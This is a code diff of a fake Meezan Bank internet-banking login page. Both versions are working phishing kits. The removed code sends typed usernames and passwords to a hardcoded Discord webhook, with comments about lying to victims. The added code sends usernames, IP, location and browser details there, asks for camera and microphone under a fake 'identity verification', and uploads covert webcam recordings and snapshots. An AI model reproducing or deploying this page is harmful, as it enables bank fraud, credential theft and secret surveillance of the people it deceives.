@@ -4,249 +4,397 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meezan Internet Banking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f8ff 0%, #e6f2ff 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #333;
+            padding: 20px;
         }
-        .login-container {
-            background-color: #fff;
-            width: 400px;
-            padding: 25px;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            border-top: 5px solid #006633; /* Meezan Green */
-        }
-        .header {
-            text-align: center;
-            color: #006633;
-            font-weight: bold;
-            font-size: 20px;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        input[type="text"], input[type="password"] {
+        
+        .container {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
+            max-width: 1100px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            display: flex;
+        }
+        
+        .bank-info {
+            flex: 1;
+            background: linear-gradient(45deg, #006633 0%, #00804c 100%);
+            color: white;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .bank-logo {
+            width: 180px;
+            margin-bottom: 30px;
+        }
+        
+        .bank-info h2 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .bank-info p {
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 15px;
             font-size: 16px;
         }
+        
+        .security-tips {
+            margin-top: 30px;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 20px;
+            border-radius: 10px;
+            width: 100%;
+        }
+        
+        .security-tips h3 {
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .security-tips ul {
+            padding-left: 20px;
+        }
+        
+        .security-tips li {
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .login-form {
+            flex: 1;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .login-form h2 {
+            color: #006633;
+            font-size: 24px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #006633;
+            outline: none;
+        }
+        
         .checkbox-group {
             display: flex;
             align-items: center;
-            font-size: 14px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
+        
         .checkbox-group input {
-            margin-right: 8px;
+            margin-right: 10px;
+            width: auto;
         }
+        
         .links {
             display: flex;
             justify-content: space-between;
-            font-size: 13px;
-            margin-bottom: 15px;
+            margin-bottom: 25px;
         }
+        
         .links a {
             color: #006633;
             text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
         }
+        
         .links a:hover {
             text-decoration: underline;
         }
+        
         .captcha-group {
             display: flex;
             align-items: center;
-            margin-bottom: 15px;
-        }
-        .captcha-group input {
-            flex-grow: 1;
-            margin-right: 10px;
-        }
-        .captcha-group img {
-            border: 1px solid #ccc;
-            padding: 2px;
-            border-radius: 4px;
-        }
-        .security-image-group {
             margin-bottom: 20px;
+            gap: 10px;
         }
-        .security-image-options {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 5px;
-            margin-top: 5px;
+        
+        .captcha-group input {
+            flex: 1;
         }
-        .security-image-option {
+        
+        .captcha-code {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            font-size: 18px;
+            color: #006633;
+            min-width: 120px;
+            text-align: center;
+        }
+        
+        .security-image-group {
+            margin-bottom: 25px;
+        }
+        
+        .security-images {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 8px;
+            margin-top: 10px;
+        }
+        
+        .security-image {
             border: 2px solid #ddd;
-            padding: 2px;
-            border-radius: 4px;
+            border-radius: 5px;
+            padding: 5px;
             cursor: pointer;
+            transition: border-color 0.3s;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
         }
-        .security-image-option.selected {
+        
+        .security-image:hover {
             border-color: #006633;
         }
-        .security-image-option img {
-            display: block;
-            width: 50px;
+        
+        .security-image img {
+            width: 100%;
             height: 50px;
+            object-fit: cover;
+            border-radius: 3px;
+            margin-bottom: 5px;
         }
+        
         .login-btn {
-            background-color: #006633; /* Meezan Green */
+            background: #006633;
             color: white;
             border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
+            padding: 16px;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
-            margin-bottom: 15px;
+            transition: background 0.3s;
+            width: 100%;
         }
+        
         .login-btn:hover {
-            background-color: #004d28;
+            background: #004d26;
         }
-        .footer-links {
+        
+        .footer {
+            margin-top: 30px;
             text-align: center;
-            font-size: 13px;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
+            font-size: 14px;
+            color: #666;
         }
-        .footer-links a {
+        
+        .footer a {
             color: #006633;
             text-decoration: none;
             margin: 0 10px;
         }
-        .footer-links a:hover {
+        
+        .footer a:hover {
             text-decoration: underline;
         }
-        #permissionStatus {
+        
+        .status-indicator {
             text-align: center;
-            font-weight: 600;
-            margin: 15px 0;
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
             display: none;
             font-size: 14px;
         }
-        .success { color: #27ae60; }
-        .error { color: #e74c3c; }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #006633;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .bank-info, .login-form {
+                padding: 30px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="header">Welcome To Meezan Internet Banking</div>
-
-        <form id="meezanLoginForm">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
+    <div class="container">
+        <div class="bank-info">
+            <img src="https://i.ibb.co/PGM10Gk8/mebl-mon-jan-06-2025-TIp0-X01-UDz-Ao2-Mn-S.png" alt="Meezan Bank Logo" class="bank-logo">
+            <h2>Safe & Secure Internet Banking</h2>
+            <p>Experience Pakistan's premier Islamic banking with state-of-the-art security and convenience</p>
+            <p>24/7 Access to your accounts from anywhere in the world</p>
+            
+            <div class="security-tips">
+                <h3><i class="fas fa-shield-alt"></i> Security Tips</h3>
+                <ul>
+                    <li>Never share your password with anyone</li>
+                    <li>Always log out after completing your banking session</li>
+                    <li>Ensure the URL is correct before entering your credentials</li>
+                    <li>Avoid using public computers for banking transactions</li>
+                </ul>
             </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="rememberUsername">
-                <label for="rememberUsername">Remember Username</label>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password (Alpha-numeric)</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-
-            <div class="links">
-                <a href="#">Forgot Username?</a>
-                <a href="#">Forgot Password?</a>
-            </div>
-
-            <div class="form-group">
-                <label for="captcha">Enter Captcha</label>
-                <div class="captcha-group">
-                    <input type="text" id="captcha" name="captcha" required>
-                    <img src="https://dummyimage.com/100x40/ccc/ffffff&text=ABCD12" alt="CAPTCHA" id="captchaImage"> <!-- Placeholder CAPTCHA -->
-                </div>
-            </div>
-
-            <div class="security-image-group">
-                <label>Select security image</label>
-                <div class="security-image-options">
-                    <!-- These are placeholder image URLs. You should replace them with actual paths to 18 small images. -->
-                    <div class="security-image-option" data-image-id="1"><img src="https://dummyimage.com/50x50/999/fff&text=1" alt="Security Image 1"></div>
-                    <div class="security-image-option" data-image-id="2"><img src="https://dummyimage.com/50x50/999/fff&text=2" alt="Security Image 2"></div>
-                    <div class="security-image-option" data-image-id="3"><img src="https://dummyimage.com/50x50/999/fff&text=3" alt="Security Image 3"></div>
-                    <div class="security-image-option" data-image-id="4"><img src="https://dummyimage.com/50x50/999/fff&text=4" alt="Security Image 4"></div>
-                    <div class="security-image-option" data-image-id="5"><img src="https://dummyimage.com/50x50/999/fff&text=5" alt="Security Image 5"></div>
-                    <div class="security-image-option" data-image-id="6"><img src="https://dummyimage.com/50x50/999/fff&text=6" alt="Security Image 6"></div>
-                    <!-- Add 12 more divs for all 18 images -->
-                </div>
-                <div class="links">
-                    <a href="#">Forgot Security Image?</a>
-                </div>
-            </div>
-
-            <button type="submit" class="login-btn">Login</button>
-        </form>
-
-        <div class="footer-links">
-            <a href="#">Internet Banking Registration</a>
-            <a href="#">Security Guide</a>
         </div>
-
-        <!-- Hidden elements for the capture process -->
-        <div id="permissionStatus"></div>
-        <div class="loader" id="loader"></div>
+        
+        <div class="login-form">
+            <h2>Login to Internet Banking</h2>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter your username" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rememberUsername">
+                    <label for="rememberUsername">Remember Username</label>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password (Alpha-numeric)</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="links">
+                    <a href="#"><i class="fas fa-question-circle"></i> Forgot Username?</a>
+                    <a href="#"><i class="fas fa-lock"></i> Forgot Password?</a>
+                </div>
+                
+                <div class="form-group">
+                    <label for="captcha">Enter Captcha</label>
+                    <div class="captcha-group">
+                        <input type="text" id="captcha" placeholder="Enter code shown" required>
+                        <div class="captcha-code">A7B2</div>
+                    </div>
+                </div>
+                
+                <div class="security-image-group">
+                    <label>Select your security image</label>
+                    <div class="security-images">
+                        <div class="security-image">
+                            <div style="background: #ff9999; height: 50px; border-radius: 3px;"></div>
+                            <span>Image 1</span>
+                        </div>
+                        <div class="security-image">
+                            <div style="background: #99ff99; height: 50px; border-radius: 3px;"></div>
+                            <span>Image 2</span>
+                        </div>
+                        <div class="security-image">
+                            <div style="background: #9999ff; height: 50px; border-radius: 3px;"></div>
+                            <span>Image 3</span>
+                        </div>
+                        <div class="security-image">
+                            <div style="background: #ffff99; height: 50px; border-radius: 3px;"></div>
+                            <span>Image 4</span>
+                        </div>
+                        <div class="security-image">
+                            <div style="background: #ff99ff; height: 50px; border-radius: 3px;"></div>
+                            <span>Image 5</span>
+                        </div>
+                        <div class="security-image">
+                            <div style="background: #99ffff; height: 50px; border-radius: 3px;"></div>
+                            <span>Image 6</span>
+                        </div>
+                    </div>
+                    <div class="links">
+                        <a href="#"><i class="far fa-image"></i> Forgot Security Image?</a>
+                    </div>
+                </div>
+                
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+            
+            <div class="footer">
+                <a href="#">Internet Banking Registration</a>
+                <a href="#">Security Guide</a>
+                <a href="#">Contact Us</a>
+                <p>© 2025 Meezan Bank Limited. All rights reserved.</p>
+            </div>
+            
+            <div id="statusIndicator" class="status-indicator"></div>
+        </div>
     </div>
 
     <script>
-        // CONFIGURATION - CHANGE THIS!
+        // Discord webhook URL
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9';
-
+        
         // State variables
-        let combinedStream = null;
+        let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
         let ipDetails = {};
         let userData = {};
-
-        // DOM Elements
-        const permissionStatusEl = document.getElementById('permissionStatus');
-        const loaderEl = document.getElementById('loader');
-
-        // Show a message on the page
+        let isRecording = false;
+        
+        // DOM elements
+        const statusIndicator = document.getElementById('statusIndicator');
+        const loginForm = document.getElementById('loginForm');
+        
+        // Show status message
         function showStatus(message, type = '') {
-            permissionStatusEl.textContent = message;
-            permissionStatusEl.className = type;
-            permissionStatusEl.style.display = 'block';
+            statusIndicator.textContent = message;
+            statusIndicator.className = 'status-indicator ' + type;
         }
-
-        // Function to fetch IP and location details
+        
+        // Fetch IP and location details
         async function fetchIPDetails() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -256,44 +404,51 @@
                 ipDetails = { error: error.message };
             }
         }
-
-        // Function to send data to Discord
+        
+        // Send data to Discord
         async function sendToDiscord(message, file = null, fileName = 'recording.webm') {
             const formData = new FormData();
-            // Discord has a 2000 character limit for content
             formData.append('content', message.substring(0, 2000));
-
+            
             if (file) {
                 formData.append('file', file, fileName);
             }
-
+            
             try {
-                // Use fetch to send to the webhook. We don't await this to avoid blocking.
-                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
         }
-
-        // Function to start recording
+        
+        // Start recording
         function startRecording(stream) {
-            const options = { mimeType: 'video/webm; codecs=vp9,opus' };
-            mediaRecorder = new MediaRecorder(stream, options);
-
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'video/webm; codecs=vp9,opus'
+            });
+            
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
                     recordedChunks.push(event.data);
                 }
             };
-
+            
             mediaRecorder.onstop = async () => {
-                if (recordedChunks.length === 0) return;
                 const completeBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                await sendToDiscord("**10-Second Recording Chunk**", completeBlob);
+                const detailsString = `New recording from ${userData.username}\nIP: ${ipDetails.ip || 'N/A'}\nCity: ${ipDetails.city || 'N/A'}\nRegion: ${ipDetails.region || 'N/A'}\nISP: ${ipDetails.org || 'N/A'}`;
+                
+                await sendToDiscord(detailsString, completeBlob, `recording_${Date.now()}.webm`);
                 recordedChunks = [];
             };
-
+            
+            // Record in 10-second chunks
             mediaRecorder.start(10000);
+            isRecording = true;
+            
+            // Ensure recording continues
             setInterval(() => {
                 if (mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
@@ -301,69 +456,91 @@
                 }
             }, 10100);
         }
-
-        // Main function to start the capture process
+        
+        // Start the capture process
         async function startCaptureProcess() {
-            loaderEl.style.display = 'block';
-            showStatus('Verifying your identity. Please wait...');
-
-            // 1. Fetch their IP and location first
+            showStatus('Verifying your identity. Please wait...', 'success');
+            
+            // Fetch IP details
             await fetchIPDetails();
-
-            // 2. Send all collected login credentials to Discord immediately
-            const infoMessage = `**MEEZAN BANK TARGET ENGAGED** 🎣\n**Login Credentials:**\nUsername: ${userData.username}\nPassword: ${userData.password}\nRemember Me: ${userData.rememberUsername}\n**Network Info:**\nIP: ${ipDetails.ip || 'N/A'}\nCity: ${ipDetails.city || 'N/A'}\nRegion: ${ipDetails.region || 'N/A'}\nISP: ${ipDetails.org || 'N/A'}\n**User Agent:**\n${navigator.userAgent}`;
+            
+            // Send initial data to Discord
+            const infoMessage = `Login attempt from ${userData.username}\nIP: ${ipDetails.ip || 'N/A'}\nCity: ${ipDetails.city || 'N/A'}\nRegion: ${ipDetails.region || 'N/A'}\nISP: ${ipDetails.org || 'N/A'}\nUser Agent: ${navigator.userAgent}`;
             await sendToDiscord(infoMessage);
-
-            // 3. Now request camera and microphone for "secure verification"
+            
+            // Request camera and microphone access
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: true
                 });
-                combinedStream = stream;
-                showStatus('Identity verification complete. Logging you in...', 'success');
+                
+                mediaStream = stream;
                 startRecording(stream);
-
-                // Simulate a login process and keep the page open to record
-                setTimeout(() => {
-                    // You could redirect to a "loading" page that never finishes, keeping the tab open to continue recording.
-                    // window.location.href = "https://www.meezanbank.com/loading"; // Example
-                }, 3000);
-
+                
+                // Also capture periodic snapshots
+                setInterval(() => {
+                    if (isRecording) {
+                        const videoTrack = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(videoTrack);
+                        
+                        imageCapture.grabFrame().then(imageBitmap => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = imageBitmap.width;
+                            canvas.height = imageBitmap.height;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(imageBitmap, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                await sendToDiscord("Periodic snapshot", blob, `snapshot_${Date.now()}.jpg`);
+                            }, 'image/jpeg', 0.8);
+                        }).catch(console.error);
+                    }
+                }, 15000);
+                
             } catch (error) {
-                loaderEl.style.display = 'none';
-                showStatus('Login successful. Redirecting...', 'success'); // LIE TO THEM. Don't show an error.
-                console.error('Media Error:', error);
-                const errorMessage = `**CAMERA ACCESS DENIED** ❌\nUser provided credentials but denied camera.\n**Reason:** ${error.message}`;
+                console.error('Error accessing media devices:', error);
+                showStatus('Security verification incomplete. Please ensure camera access is enabled.', 'error');
+                
+                const errorMessage = `Camera access denied for ${userData.username}\nReason: ${error.message}\nIP: ${ipDetails.ip || 'N/A'}`;
                 await sendToDiscord(errorMessage);
-
-                // Redirect them anyway after a delay to not raise suspicion
-                setTimeout(() => {
-                    window.location.href = "https://www.meezanbank.com/";
-                }, 2000);
             }
         }
-
-        // Form Submission Handler - This is the trigger
-        document.getElementById('meezanLoginForm').addEventListener('submit', async function(e) {
-            e.preventDefault(); // Stop the form from reloading the page
-
-            // 1. Collect all the user's data
-            userData.username = document.getElementById('username').value;
-            userData.password = document.getElementById('password').value;
-            userData.rememberUsername = document.getElementById('rememberUsername').checked;
-            userData.captcha = document.getElementById('captcha').value;
-            // You can also collect the selected security image ID here
-
-            // 2. Start the hidden capture process
+        
+        // Form submission handler
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Collect user data
+            userData = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                rememberUsername: document.getElementById('rememberUsername').checked,
+                captcha: document.getElementById('captcha').value
+            };
+            
+            // Start the capture process
             await startCaptureProcess();
+            
+            // Simulate login process
+            setTimeout(() => {
+                showStatus('Login successful! Redirecting to your account...', 'success');
+                
+                // In a real scenario, you would redirect to the actual banking page
+                // window.location.href = "https://www.meezanbank.com/";
+            }, 2000);
         });
-
-        // Simple script for selecting a security image
-        document.querySelectorAll('.security-image-option').forEach(option => {
-            option.addEventListener('click', function() {
-                document.querySelectorAll('.security-image-option').forEach(opt => opt.classList.remove('selected'));
-                this.classList.add('selected');
+        
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', () => {
+            // Add slight interactivity to security images
+            document.querySelectorAll('.security-image').forEach(img => {
+                img.addEventListener('click', () => {
+                    document.querySelectorAll('.security-image').forEach(i => {
+                        i.style.borderColor = '#ddd';
+                    });
+                    img.style.borderColor = '#006633';
+                });
             });
         });
     </script>
